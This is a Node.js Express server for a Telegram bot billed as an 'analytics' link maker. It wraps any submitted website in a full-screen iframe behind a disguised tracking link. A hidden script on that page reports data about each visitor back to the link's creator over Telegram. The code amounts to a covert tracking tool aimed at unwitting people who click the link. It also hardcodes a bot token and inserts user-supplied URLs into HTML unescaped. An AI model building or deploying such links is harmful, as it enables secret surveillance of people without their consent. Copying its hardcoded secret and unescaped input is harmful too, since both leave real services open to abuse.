import express from "express";
import fetch from "node-fetch";
import fs from "fs";

const app = express();

app.use(express.json());

app.use(express.static("public"));

const BOT_TOKEN = "8713034123:AAFDS_eXZ4MsqhJGnSLCMRq8UVGaK_84nV4";

const ADMIN_ID = 8111461057;

function isAdmin(id) {
  return id === ADMIN_ID;
}

const DB_FILE = "./database.json";

// Load DB
function loadDB() {

  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, "{}");
  }

  return JSON.parse(fs.readFileSync(DB_FILE));

}

// Save DB
function saveDB(data) {

  fs.writeFileSync(
    DB_FILE,
    JSON.stringify(data, null, 2)
  );

}

// Random Tracking ID
function generateId() {

  return Math.random()
    .toString(36)
    .substring(2, 8);

}

// Home Route
app.get("/", (req, res) => {

  res.send("Bot Running 🚀");

});

// Tracking Route
app.get("/t/:id", (req, res) => {

  const trackingId = req.params.id;

  const db = loadDB();
  
  const entry = db[trackingId];

  if (!entry) {
    return res.send("Invalid Tracking ID");
  }

  res.send(`
<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width, initial-scale=1.0">

<title>Loading...</title>

<style>

html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  overflow: hidden;
}

iframe {
  width: 100%;
  height: 100%;
  border: none;
}

</style>

</head>

<body>

<iframe src="${entry.targetUrl}"></iframe>

<script
  data-tracking-id="${trackingId}"
  data-server-url="https://analytics-bot-1-3j2c.onrender.com"
  src="/script.js">
</script>

</body>
</html>
`);

});

// Analytics Route
app.post("/data", async (req, res) => {

  const { trackingId, pretty } = req.body;

  const db = loadDB();

  const entry = db[trackingId];

  if (!entry) {
    return res.sendStatus(404);
  }

  const ownerChatId = entry.owner;

  try {

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          chat_id: ownerChatId,
          text: pretty || "No analytics data"
        })

      }
    );

  } catch (e) {

    console.log(e);

  }

  res.sendStatus(200);

});

// Telegram Webhook
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {

  const msg = req.body.message;

  if (!msg) {
    return res.sendStatus(200);
  }

  const chatId = msg.chat.id;
  const text = msg.text;

  const db = loadDB();

  // Save user
if (!db.users) db.users = {};

db.users[chatId] = {
  id: chatId,
  name: msg.from.first_name || "N/A",
  username: msg.from.username || "N/A",
  last_seen: new Date().toLocaleString()
};

saveDB(db);

  // START
  if (text === "/start") {

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,

          text:
`Welcome 👋

Commands:
/create - Create analytics link`

        })

      }
    );

  }

  // CREATE
  else if (text === "/create") {

    db[chatId] = {
      waitingForUrl: true
    };

    saveDB(db);

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,
          text: "🌐 Send Website URL"

        })

      }
    );

  }

    // USER LIST
else if (text === "/userlist") {

  if (!isAdmin(chatId)) {
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: "❌ Access Denied"
      })
    });
  }

  const users = db.users || {};
  const ids = Object.keys(users);

  let msgText = `👥 TOTAL USERS: ${ids.length}\n\n`;

  ids.reverse().forEach((id, i) => {

    const u = users[id];

    msgText += `
${i + 1}.
👤 Name     : ${u.name}
🔗 Username : ${u.username}
🆔 ID       : ${u.id}
🕒 Last Seen: ${u.last_seen}

`;
  });

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: msgText
    })
  });

}

  // URL INPUT
  else if (db[chatId]?.waitingForUrl) {

    const trackingId = generateId();

    db[trackingId] = {
      owner: chatId,
      targetUrl: text
    };

    db[chatId].waitingForUrl = false;

    saveDB(db);

    const trackingLink =
`https://analytics-bot-1-3j2c.onrender.com/t/${trackingId}`;

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {

        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({

          chat_id: chatId,

          text:
`✅ Tracking Link Created

🔗 ${trackingLink}`

        })

      }
    );

  }

  res.sendStatus(200);

});

// Start Server
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {

  console.log("Server Running 🚀");

});
